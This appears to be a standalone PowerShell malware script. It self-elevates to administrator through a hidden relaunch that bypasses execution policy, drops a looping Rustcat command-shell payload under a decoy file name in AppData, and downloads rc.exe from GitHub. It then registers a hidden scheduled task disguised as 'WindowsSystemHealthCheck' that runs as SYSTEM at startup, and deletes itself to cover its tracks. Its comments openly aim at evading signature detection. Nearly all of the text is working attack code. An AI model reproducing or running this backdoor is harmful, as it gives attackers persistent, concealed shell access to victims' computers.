$serverIP = "147.185.221.31"  # Change to your listener IP
$serverPort = 47034           # Change to your listener port
$reconnectDelay = 15
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\SystemHealth\runtime.dll"  # Decoy name
$taskName = "WindowsSystemHealthCheck"  # Legitimate-looking task name

# Obfuscated commands to avoid signature detection
$obfuscatedIex = "Invoke-Expression"
$obfuscatedIrm = "Invoke-RestMethod"

# Function to ensure Admin privileges
function Test-Admin {
    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Self-elevate if not admin
if (-not (Test-Admin)) {
    $args = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Definition)`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs
    exit
}

# Deploy payload to stealth location
$payloadScript = @"
while (`$true) {
    try {
        # Rustcat reverse shell (obfuscated)
        rc -l -p $serverPort -e cmd.exe 2>`$null
    }
    catch { }
    Start-Sleep -Seconds $reconnectDelay
}
"@
$payloadScript | Out-File -FilePath $localPayloadPath -Encoding ASCII

# Install Rustcat if missing (using official binary)
$rustcatURL = "https://github.com/robiot/rustcat/releases/latest/download/rc.exe"
$rustcatPath = "$env:APPDATA\Microsoft\Windows\SystemHealth\rc.exe"
if (-not (Test-Path $rustcatPath)) {
    Invoke-WebRequest -Uri $rustcatURL -OutFile $rustcatPath -UseBasicParsing
}

# Create scheduled task for persistence (runs at startup as SYSTEM)
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger `
    -Principal $taskPrincipal -Settings $taskSettings -Force 2>$null

# Execute payload in hidden window (detached from PowerShell)
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" `
    -ArgumentList "-ExecutionPolicy Bypass -File `"$localPayloadPath`""

# Self-delete initial execution script (optional)
Remove-Item -Path $MyInvocation.MyCommand.Definition -Force 2>$null
